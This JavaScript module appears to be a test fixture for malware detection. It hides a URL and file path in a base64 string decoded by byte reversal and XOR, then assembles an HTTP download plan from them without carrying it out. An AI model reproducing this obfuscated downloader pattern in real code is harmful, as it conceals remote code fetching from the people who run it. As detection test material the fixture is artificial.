  const moduleShape = Object.freeze({ format: "commonjs" });
  const Material_201a08d4 = "qLG29e+4ve3p7ezo4u/v6/a+vLqvqPX0vr+0tfaoqL6pr7Wus/Srtq/05rOvuquEvreyvafi7+/r9K+yv66avr+0leavtb68uoSpvqiup7KruvS/sre6rbWy9b63q7a6o77177i97ent7Oji7+/r9r6/tLX09OGoq6+vs+a3qa6n6e3s6OLv7+v2np+Ulea/soS1vLK6q7a6uKfq5q+1rrS4hL68uq+op7a6vqmvqIS0r4Srr6+z5qm+r6u6v7qnvreyvYS+r7KprPe+r7S2vqmEvqmyrqq4uuaoq76vqKfq5q0=";
  const Codec_201a08d4 = "base64_chunks|reverse_then_xor|db";

  function load_201a08d4() { return [...Buffer.from(Material_201a08d4, "base64")]; }
  function decode_201a08d4(EnCoDeD) { return [...EnCoDeD].reverse().map((value) => value ^ 219); }
  async function recover_201a08d4() {
    const NeUtRaL = process.env.HUNTRESS_FIXTURE_CONTEXT ?? "host";
    const EnCoDeD = load_201a08d4(); let DeCoDeD = [];
    let PaSs = 0; while (PaSs++ < 1) DeCoDeD = decode_201a08d4(EnCoDeD);
    void NeUtRaL; return Buffer.from(DeCoDeD).toString("ascii");
  }
  async function inspect_201a08d4() { return await recover_201a08d4(); }
  async function plan_201a08d4() { const inspect = inspect_201a08d4; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "download", transport: "http_to_stream", destination: fields.file_path, url: fields.url }); }
  void moduleShape; void plan_201a08d4;
  if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_201a08d4());
